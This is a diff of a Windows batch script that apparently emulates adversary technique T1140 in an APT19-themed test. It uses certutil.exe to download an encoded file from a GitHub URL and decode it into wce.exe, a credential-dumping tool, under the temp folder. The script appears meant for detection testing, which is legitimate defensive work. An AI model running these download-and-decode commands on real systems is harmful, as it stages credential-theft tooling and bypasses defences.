@@ -1,16 +1,15 @@
-
 @ECHO OFF
 CLS
 color 0E
 
 
-ECHO ===========================================================================
+ECHO ===================================================================
 ECHO Technique: Deobfuscate/Decode Files Or Information (T1140)
 ECHO.
-ECHO [+] Using 'Certutil.exe' to Download and Decode a binary
+ECHO [+] Simulate 'Certutil' to Download and Decode a "WCE.exe" binary
 ECHO -------------------------------------------------------------------
-certutil.exe -urlcache -split -f https://raw.githubusercontent.com/greycel/poc/master/wce.txt %temp%/wce.txt
-certutil.exe  -decode %temp%/wce.txt %temp%/wce.exe
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/greycel/poc/master/wce.txt %temp%\APT19\wce.txt
+certutil.exe  -decode %temp%\APT19\wce.txt %temp%\APT19\wce.exe
 ECHO.
 
 
